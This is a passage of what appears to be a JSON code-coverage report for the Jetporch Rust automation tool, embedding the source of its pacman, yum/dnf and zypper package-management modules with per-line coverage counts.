get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(PacmanAction {\n                    package:    handle.template.string_no_spaces(request, tm, \u0026String::from(\"package\"), \u0026self.package)?,\n                    version:    handle.template.string_option_no_spaces(\u0026request, tm, \u0026String::from(\"version\"), \u0026self.version)?,\n                    update:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"update\"), \u0026self.update)?,\n                    remove:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?)\n            }\n        );\n    }\n}\n\nimpl IsAction for PacmanAction {\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n        return self.common_dispatch(handle,request);\n    }\n}\n\nimpl PackageManagementModule for PacmanAction {\n\n    fn is_update(\u0026self) -\u003e bool {\n        return self.update;\n    }\n\n    fn is_remove(\u0026self) -\u003e bool {\n        return self.remove; \n    }\n\n    fn get_version(\u0026self) -\u003e Option\u003cString\u003e {\n        return self.version.clone();\n    }\n\n    fn initial_setup(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(());\n    }\n\n    fn get_local_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let actual_package = self.get_actual_package();\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"pacman -Q --info {}\", actual_package),\n            false =\u003e format!(\"pacman -Q --info {}-{}\", actual_package, self.version.as_ref().unwrap())\n        };\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (rc,out) = cmd_info(\u0026result);\n        if rc \u003e 1 {\n            return Err(handle.response.is_failed(request, \u0026String::from(\"pacman query failed\")));\n        }\n        let details = self.parse_package_details(\u0026out.clone());\n        return Ok(details);\n    }\n\n    fn get_remote_version(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // FIXME: (?) without this implemented this module will always return \"Modified\" with update: true\n        return Ok(None);\n    }\n\n    fn install_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e{\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"pacman -S '{}' --noconfirm --noprogressbar --needed\", self.package),\n            false =\u003e format!(\"pacman -S '{}={}' --noconfirm --noprogressbar --needed\", self.package, self.version.as_ref().unwrap())\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn update_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e{\n        let actual_package = self.get_actual_package();\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"pacman -Syu '{}' --quiet --noconfirm\", actual_package),\n            false =\u003e format!(\"pacman -Syu '{}={}' --quiet --noconfirm\", self.package, self.version.as_ref().unwrap())\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn remove_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e{\n        let actual_package = self.get_actual_package();\n        let cmd = format!(\"pacman -R '{}' --noconfirm --noprogressbar\", actual_package);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n}\n\nimpl PacmanAction {\n\n    pub fn get_actual_package(\u0026self) -\u003e String {\n        if self.package.contains(\"/\") {\n            let last = self.package.split(\"/\").last();\n            match last {\n                Some(x) =\u003e x.to_string(),\n                None =\u003e self.package.clone() // should be impossible, appease compiler\n            } \n        } else {\n            return self.package.clone()\n        }\n    }\n\n    pub fn parse_package_details(\u0026self, out: \u0026String) -\u003e Option\u003cPackageDetails\u003e {\n        let mut name: Option\u003cString\u003e = None;\n        let mut version: Option\u003cString\u003e = None;\n        for line in out.lines() {\n            if line.starts_with(\"error:\") {\n                // FIXME: is this possible with rc == 1?\n                return None;\n            }\n            let mut tokens = line.split(\":\");\n            let key = tokens.nth(0);\n            let value = tokens.nth(0);\n            if key.is_some() \u0026\u0026 value.is_some() {\n                let key2 = key.unwrap().trim();\n                let value2 = value.unwrap().trim();\n                if key2.eq(\"Name\")    { name = Some(value2.to_string());           }\n                if key2.eq(\"Version\") { version = Some(value2.to_string()); break; }\n            }\n        }\n        if name.is_some() \u0026\u0026 version.is_some() {\n            return Some(PackageDetails { name: name.unwrap().clone(), version: version.unwrap().clone() });\n        } else {\n            return None;\n        }\n    }\n\n}\n","traces":[{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":75},{"path":["/","Users","wings","projects","jetpack","src","modules","packages","yum_dnf.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::modules::packages::common::{PackageManagementModule,PackageDetails};\nuse crate::handle::handle::{TaskHandle,CheckRc};\nuse crate::inventory::hosts::PackagePreference;\nuse serde::{Deserialize};\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"yum_dnf\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct YumDnfTask {\n    pub name: Option\u003cString\u003e,\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: Option\u003cString\u003e,\n    pub remove: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct YumDnfAction {\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: bool,\n    pub remove: bool,\n}\n\nimpl IsTask for YumDnfTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(YumDnfAction {\n                    package:    handle.template.string_no_spaces(request, tm, \u0026String::from(\"package\"), \u0026self.package)?,\n                    version:    handle.template.string_option_no_spaces(\u0026request, tm, \u0026String::from(\"version\"), \u0026self.version)?,\n                    update:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"update\"), \u0026self.update)?,\n                    remove:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for YumDnfAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n        return self.common_dispatch(handle,request);\n    }\n\n}\n\nimpl PackageManagementModule for YumDnfAction {\n\n    fn is_update(\u0026self) -\u003e bool {\n        return self.update;\n    }\n\n    fn is_remove(\u0026self) -\u003e bool {\n        return self.remove; \n    }\n\n    fn get_version(\u0026self) -\u003e Option\u003cString\u003e {\n        return self.version.clone();\n    }\n\n    fn initial_setup(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        self.set_package_preference(handle,request)?;\n        return Ok(());\n    }\n\n    fn get_local_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let which = self.get_package_manager(handle);\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"{} info {}\", which, self.package),\n            false =\u003e format!(\"{} info {}-{}\", which, self.package, self.version.as_ref().unwrap())\n        };\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (_rc,out) = cmd_info(\u0026result);\n        let details = self.parse_local_package_details(\u0026out.clone())?;\n        return Ok(details);\n    }\n\n    fn get_remote_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"repoquery {} --queryformat {}\", self.package, \"'%{version}'\");\n        let result = handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (_rc,out) = cmd_info(\u0026result);\n        let details = self.parse_remote_package_details(\u0026out.clone())?;\n        return Ok(details);\n    }\n    \n    fn install_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e{\n        let which = self.get_package_manager(handle);\n        let cmd = match self.version.is_none() {\n            true =\u003e format!(\"{} install '{}' -y\", which, self.package),\n            false =\u003e format!(\"{} install '{}-{}' -y\", which, self.package, self.version.as_ref().unwrap())\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn update_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e{\n        let which = self.get_package_manager(handle);\n        let cmd = format!(\"{} update '{}' -y\", which, self.package);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn remove_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e{\n        let which = self.get_package_manager(handle);\n        let cmd = format!(\"{} remove '{}' -y\", which, self.package);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n}\n\nimpl YumDnfAction {\n\n    pub fn set_package_preference(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        if handle.host.read().unwrap().package_preference.is_some() {\n            return Ok(());\n        }\n        match handle.remote.get_mode(request, \u0026String::from(\"/usr/bin/dnf\"))? {\n            Some(_) =\u003e {\n                handle.host.write().unwrap().package_preference = Some(PackagePreference::Dnf);\n            }\n            None =\u003e match handle.remote.get_mode(request, \u0026String::from(\"/usr/bin/yum\"))? {\n                Some(_) =\u003e {\n                    handle.host.write().unwrap().package_preference = Some(PackagePreference::Yum);\n                }\n                None =\u003e { return Err(handle.response.is_failed(request, \u0026String::from(\"neither dnf nor yum detected\"))); }\n            }\n        }\n        Ok(())\n    }\n\n    pub fn get_package_preference(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e) -\u003e Option\u003cPackagePreference\u003e {\n        handle.host.read().unwrap().package_preference\n    }\n\n    pub fn get_package_manager(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e) -\u003e String {\n        match self.get_package_preference(handle) {\n            Some(PackagePreference::Yum) =\u003e String::from(\"yum\"),\n            Some(PackagePreference::Dnf) =\u003e String::from(\"dnf\"),\n            _ =\u003e { panic!(\"internal error, package preference not set correctly\"); }\n        }\n    }\n\n    fn parse_local_package_details(\u0026self, out: \u0026String) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let mut name: Option\u003cString\u003e = None;\n        let mut version: Option\u003cString\u003e = None;\n        for line in out.lines() {\n            if line.starts_with(\"Available\") {\n                return Ok(None);\n            }\n            let mut tokens = line.split(\":\");\n            let key = tokens.nth(0);\n            let value = tokens.nth(0);\n            if key.is_some() \u0026\u0026 value.is_some() {\n                let key2 = key.unwrap().trim();\n                let value2 = value.unwrap().trim();\n                if key2.eq(\"Name\")    { name = Some(value2.to_string());           }\n                if key2.eq(\"Version\") { version = Some(value2.to_string()); break; }\n            }\n        }\n        if name.is_some() \u0026\u0026 version.is_some() {\n            return Ok(Some(PackageDetails { name: name.unwrap().clone(), version: version.unwrap().clone() }));\n        } else {\n            return Ok(None);\n        }\n    }\n    \n    fn parse_remote_package_details(\u0026self, out: \u0026String) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        // FYI: this command doesn't have useful return codes\n        for line in out.lines() {\n            if ! line.contains(\"metadata expiration\") {\n                return Ok(Some(PackageDetails {\n                    name: self.package.clone(),\n                    version: line.trim().to_string(),\n                }));\n            }\n        }\n        return Ok(None);\n    }\n\n}\n","traces":[{"line":47,"address":[],"length":0,"stats":{"Line":2}},{"line":48,"address":[],"length":0,"stats":{"Line":1}},{"line":49,"address":[],"length":0,"stats":{"Line":1}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":183,"address":[],"length":0,"stats":{"Line":0}},{"line":184,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":95},{"path":["/","Users","wings","projects","jetpack","src","modules","packages","zypper.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::modules::packages::common::{PackageManagementModule,PackageDetails};\nuse crate::handle::handle::{TaskHandle,CheckRc};\nuse serde::Deserialize;\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"zypper\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct ZypperTask {\n    pub name: Option\u003cString\u003e,\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: Option\u003cString\u003e,\n    pub remove: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct ZypperAction {\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: bool,\n    pub remove: bool,\n}\n\nimpl IsTask for ZypperTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(ZypperAction {\n                    package:    handle.template.string_no_spaces(request, tm, \u0026String::from(\"package\"), \u0026self.package)?,\n                    version:    handle.template.string_option_no_spaces(\u0026request, tm, \u0026String::from(\"version\"), \u0026self.version)?,\n                    update:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"update\"), \u0026self.update)?,\n                    remove:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?)\n            }\n        );\n    }\n\n}\n\nimpl IsAction for ZypperAction {\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n        return self.common_dispatch(handle,request);\n    }\n}\n\nimpl PackageManagementModule for ZypperAction {\n\n    fn initial_setup(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        // nothing to do here, see how this was used in yum_dnf.rs\n        return Ok(());\n    }\n\n    fn is_update(\u0026self) -\u003e bool {\n        return self.update;\n    }\n\n    fn is_remove(\u0026self) -\u003e bool {\n        return self.remove; \n    }\n\n    fn get_version(\u0026self) -\u003e Option\u003cString\u003e {\n        return self.version.clone();\n    }\n\n    fn get_remote_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"zypper --non-interactive --quiet search --match-exact --details '{}'\", self.package);\n        let result = handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Unchecked);\n        match result {\n            Ok(r) =\u003e {\n                let (rc,out) = cmd_info(\u0026r);\n                if rc == 104 {\n                    Ok(None)\n                } else if rc != 0 {\n                    Err(r)\n                } else {\n                    self.parse_zypper_search_table(handle, request, \u0026out)\n                }\n            },\n            Err(e) =\u003e Err(e)\n        }\n    }\n\n    fn get_local_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"zypper --non-interactive --quiet search --match-exact --details --installed-only '{}'\", self.package);\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Unchecked);\n        return match result {\n            Ok(r) =\u003e {\n                let (rc,out) = cmd_info(\u0026r);\n                if rc == 104 {\n                    Ok(None)\n                } else if rc != 0 {\n                    Err(r)\n                } else {\n                    self.parse_zypper_search_table(handle, request, \u0026out)\n                }\n            },\n            Err(e) =\u003e Err(e)\n        }\n    }\n\n    fn install_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = match \u0026self.version {\n            Some(version) =\u003e format!(\"zypper --non-interactive --quiet  install '{}={}'\", self.package, version),\n            None =\u003e format!(\"zypper --non-interactive --quiet install '{}'\", self.package),\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn update_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: 